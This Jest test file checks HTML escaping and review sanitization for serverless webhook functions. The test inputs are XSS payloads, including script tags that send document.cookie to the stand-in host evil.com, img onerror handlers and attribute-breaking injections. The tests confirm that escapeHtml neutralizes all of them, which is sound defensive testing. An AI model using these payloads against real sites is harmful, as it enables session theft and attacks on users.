/**
 * Sanitization Tests
 *
 * Tests HTML escaping and input sanitization used across serverless functions
 * (review-webhook.js, approve-review.js, stripe-webhook.js)
 */

// Replicate the escapeHtml function used in serverless functions
const escapeHtml = (str) => {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
};

describe('Sanitization', () => {
  describe('escapeHtml', () => {
    test('escapes HTML tags', () => {
      expect(escapeHtml('<script>alert("xss")</script>')).toBe(
        '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
      );
    });

    test('escapes ampersands', () => {
      expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry');
    });

    test('escapes double quotes', () => {
      expect(escapeHtml('He said "hello"')).toBe('He said &quot;hello&quot;');
    });

    test('escapes single quotes', () => {
      expect(escapeHtml("It's great")).toBe('It&#39;s great');
    });

    test('escapes angle brackets', () => {
      expect(escapeHtml('1 < 2 > 0')).toBe('1 &lt; 2 &gt; 0');
    });

    test('handles multiple special characters together', () => {
      expect(escapeHtml('<div class="test">&</div>')).toBe(
        '&lt;div class=&quot;test&quot;&gt;&amp;&lt;/div&gt;'
      );
    });

    test('leaves plain text unchanged', () => {
      expect(escapeHtml('Just a normal review')).toBe('Just a normal review');
    });

    test('returns empty string for null', () => {
      expect(escapeHtml(null)).toBe('');
    });

    test('returns empty string for undefined', () => {
      expect(escapeHtml(undefined)).toBe('');
    });

    test('returns empty string for empty string', () => {
      expect(escapeHtml('')).toBe('');
    });

    test('converts numbers to string', () => {
      expect(escapeHtml(42)).toBe('42');
    });

    test('handles realistic XSS attack in review name', () => {
      const maliciousName = '<img src=x onerror=alert(1)>';
      expect(escapeHtml(maliciousName)).toBe(
        '&lt;img src=x onerror=alert(1)&gt;'
      );
    });

    test('handles script injection in review text', () => {
      const maliciousReview = 'Great product!<script>document.location="http://evil.com?c="+document.cookie</script>';
      const escaped = escapeHtml(maliciousReview);
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
    });

    test('handles event handler injection', () => {
      const malicious = '" onmouseover="alert(1)" data-x="';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain('"');
      expect(escaped).toContain('&quot;');
    });

    test('handles nested HTML injection', () => {
      const malicious = '<<script>script>alert(1)<</script>/script>';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain('<script>');
    });
  });

  describe('review data sanitization', () => {
    // Replicate the review sanitization from approve-review.js
    function sanitizeReview(reviewData) {
      return {
        id: Date.now().toString(),
        rating: Math.min(5, Math.max(1, parseInt(reviewData.rating) || 1)),
        name: escapeHtml(reviewData.name.trim()),
        review: escapeHtml(reviewData.review.trim()),
        date: new Date().toISOString().split('T')[0],
        verified: !!reviewData.email
      };
    }

    test('clamps rating to max 5', () => {
      const review = sanitizeReview({ rating: '99', name: 'Test', review: 'Good', email: '' });
      expect(review.rating).toBe(5);
    });

    test('clamps rating to min 1', () => {
      const review = sanitizeReview({ rating: '-3', name: 'Test', review: 'Good', email: '' });
      expect(review.rating).toBe(1);
    });

    test('defaults invalid rating to 1', () => {
      const review = sanitizeReview({ rating: 'abc', name: 'Test', review: 'Good', email: '' });
      expect(review.rating).toBe(1);
    });

    test('escapes HTML in name', () => {
      const review = sanitizeReview({ rating: '5', name: '<b>Hacker</b>', review: 'Good', email: '' });
      expect(review.name).toBe('&lt;b&gt;Hacker&lt;/b&gt;');
    });

    test('escapes HTML in review text', () => {
      const review = sanitizeReview({ rating: '5', name: 'Test', review: '<script>alert(1)</script>', email: '' });
      expect(review.review).not.toContain('<script>');
    });

    test('trims whitespace from name and review', () => {
      const review = sanitizeReview({ rating: '4', name: '  John  ', review: '  Great!  ', email: '' });
      expect(review.name).toBe('John');
      expect(review.review).toBe('Great!');
    });

    test('sets verified true when email provided', () => {
      const review = sanitizeReview({ rating: '5', name: 'Test', review: 'Good', email: 'a@b.com' });
      expect(review.verified).toBe(true);
    });

    test('sets verified false when email empty', () => {
      const review = sanitizeReview({ rating: '5', name: 'Test', review: 'Good', email: '' });
      expect(review.verified).toBe(false);
    });

    test('generates valid date format', () => {
      const review = sanitizeReview({ rating: '5', name: 'Test', review: 'Good', email: '' });
      expect(review.date).toMatch(/^\d{4}-\d{2}-\d{2}$/);
    });

    test('generates string id', () => {
      const review = sanitizeReview({ rating: '5', name: 'Test', review: 'Good', email: '' });
      expect(typeof review.id).toBe('string');
      expect(review.id.length).toBeGreaterThan(0);
    });
  });

  describe('email template injection prevention', () => {
    // Simulates how the approval email builds the HTML body
    function buildApprovalEmailBody(review) {
      const stars = '★'.repeat(parseInt(review.rating)) + '☆'.repeat(5 - parseInt(review.rating));
      return `
        <p><strong>Name:</strong> ${escapeHtml(review.name)}</p>
        <p><strong>Email:</strong> ${escapeHtml(review.email) || 'Not provided'}</p>
        <p><strong>Review:</strong></p>
        <p>${escapeHtml(review.review)}</p>
      `;
    }

    test('XSS in name does not render in email', () => {
      const html = buildApprovalEmailBody({
        rating: '5',
        name: '<img src=x onerror=alert(document.cookie)>',
        email: '',
        review: 'Good'
      });
      expect(html).not.toContain('<img');
      expect(html).toContain('&lt;img');
    });

    test('XSS in review does not render in email', () => {
      const html = buildApprovalEmailBody({
        rating: '5',
        name: 'John',
        email: '',
        review: '<script>fetch("http://evil.com?c="+document.cookie)</script>'
      });
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    test('XSS in email does not render in email', () => {
      const html = buildApprovalEmailBody({
        rating: '5',
        name: 'John',
        email: '"><script>alert(1)</script>',
        review: 'Good'
      });
      expect(html).not.toContain('<script>');
    });

    test('shows Not provided for empty email', () => {
      const html = buildApprovalEmailBody({
        rating: '5',
        name: 'John',
        email: '',
        review: 'Good'
      });
      expect(html).toContain('Not provided');
    });

    test('shows Not provided for null email', () => {
      const html = buildApprovalEmailBody({
        rating: '5',
        name: 'John',
        email: null,
        review: 'Good'
      });
      expect(html).toContain('Not provided');
    });
  });
});
